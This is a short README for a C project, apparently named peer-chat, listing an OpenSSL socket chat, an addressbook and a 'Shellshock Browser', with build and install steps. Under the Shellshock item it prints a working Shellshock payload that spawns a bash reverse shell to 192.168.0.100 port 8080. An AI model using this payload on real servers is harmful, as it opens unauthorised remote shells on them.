# peer-chat
* Server and Client OpenSSL Peer Socket Chat (Windows/Linux)

    most Bug free
    
* Addressbook functionality (Windows/Linux)

    Entry has Bugs
    
* http/https Shellshock Browser (Windows/Linux)

    the Shellshock it self: "env x='() { :;}; ' $(command -v bash) -i >& /dev/tcp/192.168.0.100/8080 0>&1"

# building
* On Linux: make

* On Windows: use DevC++ (latest) WIN32/WIN64 Compiler

with linker options:

-mwindows
-lssl
-lcrypto
-leay32 
-lwsock32
-lws2_32 
-lpthread
-s

Code profiling -std=ISO C99

# install
* On Linux: sudo make install

# uninstall
* On Linux: make uninstall

# clean
* On Linux: make clean
